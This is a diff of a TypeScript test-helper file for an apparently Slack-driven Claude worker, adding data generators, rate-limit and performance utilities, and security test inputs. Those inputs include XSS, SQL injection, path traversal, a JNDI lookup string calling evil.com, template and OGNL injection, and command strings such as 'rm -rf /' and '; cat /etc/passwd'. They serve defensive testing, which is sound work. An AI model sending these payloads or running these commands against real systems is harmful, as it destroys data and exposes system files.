@@ -1,207 +1,11 @@
 #!/usr/bin/env bun
 
 /**
- * Test utilities for worker package
+ * Common test helper utilities
  */
 
-import { jest } from "bun:test";
-
-/**
- * Mock environment variables for testing
- */
-export function createMockEnvironment(overrides: Record<string, string> = {}) {
-  return {
-    SESSION_KEY: "test-session-123",
-    USER_ID: "U123456789",
-    USERNAME: "testuser",
-    CHANNEL_ID: "C123456789",
-    THREAD_TS: "1234567890.123456",
-    REPOSITORY_URL: "https://github.com/test/repo",
-    USER_PROMPT: Buffer.from("Help me debug this code").toString("base64"),
-    SLACK_RESPONSE_CHANNEL: "C123456789",
-    SLACK_RESPONSE_TS: "1234567890.123456",
-    SLACK_BOT_TOKEN: "xoxb-test-token",
-    GITHUB_TOKEN: "ghp_test_token",
-    WORKSPACE_DIR: "/workspace",
-    RECOVERY_MODE: "false",
-    CLAUDE_OPTIONS: JSON.stringify({
-      model: process.env.AGENT_DEFAULT_MODEL || "claude-3-sonnet",
-      temperature: 0.7,
-    }),
-    ...overrides,
-  };
-}
-
-/**
- * Mock Slack client implementation
- */
-export const mockSlackClient = {
-  chat: {
-    postMessage: jest.fn().mockResolvedValue({
-      ok: true,
-      ts: "1234567890.123456",
-      channel: "C123456789",
-    }),
-    update: jest.fn().mockResolvedValue({
-      ok: true,
-      ts: "1234567890.123456",
-      channel: "C123456789",
-    }),
-    delete: jest.fn().mockResolvedValue({
-      ok: true,
-    }),
-  },
-  conversations: {
-    info: jest.fn().mockResolvedValue({
-      ok: true,
-      channel: {
-        id: "C123456789",
-        name: "general",
-        is_private: false,
-      },
-    }),
-    history: jest.fn().mockResolvedValue({
-      ok: true,
-      messages: [],
-    }),
-    replies: jest.fn().mockResolvedValue({
-      ok: true,
-      messages: [],
-    }),
-  },
-  users: {
-    info: jest.fn().mockResolvedValue({
-      ok: true,
-      user: {
-        id: "U123456789",
-        name: "testuser",
-        real_name: "Test User",
-        profile: {
-          email: "test@example.com",
-        },
-      },
-    }),
-  },
-  files: {
-    upload: jest.fn().mockResolvedValue({
-      ok: true,
-      file: {
-        id: "F123456789",
-        name: "output.txt",
-      },
-    }),
-  },
-};
-
-/**
- * Mock workspace setup implementation
- */
-export const mockWorkspaceSetup = {
-  createWorkspace: jest.fn().mockResolvedValue("/workspace/user-123"),
-  cloneRepository: jest.fn().mockResolvedValue("/workspace/user-123/repo"),
-  setupEnvironment: jest.fn().mockResolvedValue(undefined),
-  validateSetup: jest.fn().mockResolvedValue(true),
-  cleanup: jest.fn().mockResolvedValue(undefined),
-  getDiskUsage: jest.fn().mockResolvedValue(1024 * 1024), // 1MB
-  createSecureDirectory: jest.fn().mockResolvedValue(undefined),
-  sanitizeUserInput: jest
-    .fn()
-    .mockImplementation((input: string) => input.replace(/[<>"`]/g, "")),
-};
-
-/**
- * Mock Claude session runner implementation
- */
-export const mockSessionRunner = {
-  executePrompt: jest.fn().mockResolvedValue("Claude response"),
-  getSessionState: jest.fn().mockResolvedValue({
-    sessionKey: "test-session",
-    status: "active",
-    conversation: [],
-  }),
-  addProgressCallback: jest.fn(),
-  cleanup: jest.fn().mockResolvedValue(undefined),
-  persistSession: jest.fn().mockResolvedValue("/gcs/path/session"),
-  recoverSession: jest.fn().mockResolvedValue(true),
-};
-
-/**
- * Mock file system operations
- */
-export const mockFileSystem = {
-  mkdir: jest.fn().mockResolvedValue(undefined),
-  writeFile: jest.fn().mockResolvedValue(undefined),
-  readFile: jest.fn().mockResolvedValue(Buffer.from("mock file content")),
-  access: jest.fn().mockResolvedValue(undefined),
-  rm: jest.fn().mockResolvedValue(undefined),
-  chmod: jest.fn().mockResolvedValue(undefined),
-  stat: jest.fn().mockResolvedValue({
-    isDirectory: () => true,
-    isFile: () => false,
-    size: 1024,
-  }),
-  readdir: jest.fn().mockResolvedValue([]),
-  copyFile: jest.fn().mockResolvedValue(undefined),
-  symlink: jest.fn().mockResolvedValue(undefined),
-};
-
-/**
- * Mock child process for git operations
- */
-export const mockChildProcess = {
-  spawn: jest.fn().mockReturnValue({
-    stdout: {
-      on: jest.fn(),
-      pipe: jest.fn(),
-    },
-    stderr: {
-      on: jest.fn(),
-      pipe: jest.fn(),
-    },
-    on: jest.fn().mockImplementation((event: string, callback: any) => {
-      if (event === "exit") {
-        setTimeout(() => callback(0), 10); // Success exit code
-      }
-    }),
-    kill: jest.fn(),
-    pid: 12345,
-  }),
-  exec: jest.fn().mockImplementation((_command: string, callback: any) => {
-    setTimeout(() => callback(null, "command output", ""), 10);
-  }),
-};
-
-/**
- * Progress tracking utilities
- */
-export class MockProgressTracker {
-  private updates: string[] = [];
-  private callbacks: ((update: string) => void)[] = [];
-
-  addCallback(callback: (update: string) => void) {
-    this.callbacks.push(callback);
-  }
-
-  updateProgress(message: string) {
-    this.updates.push(message);
-    this.callbacks.forEach((callback) => {
-      callback(message);
-    });
-  }
-
-  getUpdates(): string[] {
-    return [...this.updates];
-  }
-
-  getLastUpdate(): string | null {
-    return this.updates[this.updates.length - 1] || null;
-  }
-
-  clear() {
-    this.updates = [];
-    this.callbacks = [];
-  }
-}
+import { expect, jest } from "bun:test";
+import { createMockEnvironment } from "./mock-factories";
 
 /**
  * Test data generators
@@ -213,8 +17,12 @@ export const generators = {
     `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
   randomChannelId: () =>
     `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
+  randomTeamId: () =>
+    `T${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
   randomMessageTs: () =>
     `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
+  randomJobName: () =>
+    `claude-worker-test-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
   randomWorkspaceDir: () =>
     `/workspace/${Math.random().toString(36).substr(2, 8)}`,
   randomRepoUrl: (org = "test", repo = "repo") =>
@@ -222,9 +30,45 @@ export const generators = {
 };
 
 /**
+ * Rate limiting test helpers
+ */
+export const rateLimitTestHelpers = {
+  /**
+   * Create multiple job requests for the same user to test rate limiting
+   */
+  createRateLimitRequests(userId: string, count: number): any[] {
+    return Array.from({ length: count }, (_, i) => ({
+      userId,
+      sessionKey: `rate-limit-test-${i}`,
+    }));
+  },
+
+  /**
+   * Mock time advancement for testing rate limit windows
+   */
+  mockTimeAdvancement(minutes: number) {
+    const originalNow = Date.now;
+    const advancedTime = originalNow() + minutes * 60 * 1000;
+    Date.now = jest.fn().mockReturnValue(advancedTime);
+    return () => {
+      Date.now = originalNow;
+    };
+  },
+};
+
+/**
  * Security test cases
  */
 export const securityTestCases = {
+  maliciousInputs: [
+    "<script>alert('xss')</script>",
+    "'; DROP TABLE users; --",
+    "../../../etc/passwd",
+    "${jndi:ldap://evil.com/exploit}",
+    "{{7*7}}",
+    "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}",
+  ],
+
   maliciousPrompts: [
     "rm -rf /",
     "; cat /etc/passwd",
@@ -253,11 +97,57 @@ export const securityTestCases = {
   ],
 
   oversizedInputs: {
+    longText: "a".repeat(10000),
     hugeName: "a".repeat(1000000),
     hugePrompt: "x".repeat(10000000),
+    deepObject: JSON.stringify({
+      nested: { very: { deep: { object: "value" } } },
+    }),
     deepNesting: JSON.stringify({ a: { b: { c: { d: { e: "deep" } } } } }),
+    manyFields: Object.fromEntries(
+      Array.from({ length: 1000 }, (_, i) => [`field${i}`, `value${i}`])
+    ),
   },
 };
+
+/**
+ * Performance test utilities
+ */
+export class PerformanceTracker {
+  private metrics: Map<string, number[]> = new Map();
+
+  startTimer(name: string): () => number {
+    const start = performance.now();
+    return () => {
+      const duration = performance.now() - start;
+      if (!this.metrics.has(name)) {
+        this.metrics.set(name, []);
+      }
+      this.metrics.get(name)?.push(duration);
+      return duration;
+    };
+  }
+
+  getStats(name: string) {
+    const values = this.metrics.get(name) || [];
+    if (values.length === 0) return null;
+
+    const sorted = [...values].sort((a, b) => a - b);
+    return {
+      count: values.length,
+      min: sorted[0],
+      max: sorted[sorted.length - 1],
+      mean: values.reduce((a, b) => a + b, 0) / values.length,
+      median: sorted[Math.floor(sorted.length / 2)],
+      p95: sorted[Math.floor(sorted.length * 0.95)],
+      p99: sorted[Math.floor(sorted.length * 0.99)],
+    };
+  }
+
+  clear() {
+    this.metrics.clear();
+  }
+}
 
 /**
  * Resource monitoring utilities
@@ -293,6 +183,102 @@ export class MockResourceMonitor {
     this.recordMetric("disk", Math.random() * 10 * 1024 * 1024 * 1024); // Random 10GB
   }
 }
+
+/**
+ * Progress tracking utilities
+ */
+export class MockProgressTracker {
+  private updates: string[] = [];
+  private callbacks: ((update: string) => void)[] = [];
+
+  addCallback(callback: (update: string) => void) {
+    this.callbacks.push(callback);
+  }
+
+  updateProgress(message: string) {
+    this.updates.push(message);
+    this.callbacks.forEach((callback) => {
+      callback(message);
+    });
+  }
+
+  getUpdates(): string[] {
+    return [...this.updates];
+  }
+
+  getLastUpdate(): string | null {
+    return this.updates[this.updates.length - 1] || null;
+  }
+
+  clear() {
+    this.updates = [];
+    this.callbacks = [];
+  }
+}
+
+/**
+ * Async test utilities
+ */
+export const asyncTestUtils = {
+  /**
+   * Wait for a condition to be true
+   */
+  async waitFor(
+    condition: () => boolean | Promise<boolean>,
+    timeout: number = 5000,
+    interval: number = 100
+  ): Promise<void> {
+    const start = Date.now();
+    while (Date.now() - start < timeout) {
+      if (await condition()) {
+        return;
+      }
+      await new Promise((resolve) => setTimeout(resolve, interval));
+    }
+    throw new Error(`Condition not met within ${timeout}ms`);
+  },
+
+  /**
+   * Create a delay
+   */
+  delay(ms: number): Promise<void> {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  },
+
+  /**
+   * Test race conditions
+   */
+  async testConcurrency<T>(
+    tasks: (() => Promise<T>)[],
+    expectedResults?: T[]
+  ): Promise<T[]> {
+    const results = await Promise.allSettled(tasks.map((task) => task()));
+
+    const fulfilled = results
+      .filter(
+        (result): result is PromiseFulfilledResult<Awaited<T>> =>
+          result.status === "fulfilled"
+      )
+      .map((result) => result.value);
+
+    const rejected = results
+      .filter(
+        (result): result is PromiseRejectedResult =>
+          result.status === "rejected"
+      )
+      .map((result) => result.reason);
+
+    if (rejected.length > 0) {
+      console.warn(`${rejected.length} tasks failed:`, rejected);
+    }
+
+    if (expectedResults) {
+      expect(fulfilled).toEqual(expectedResults as Awaited<T>[]);
+    }
+
+    return fulfilled;
+  },
+};
 
 /**
  * Timeout and retry utilities
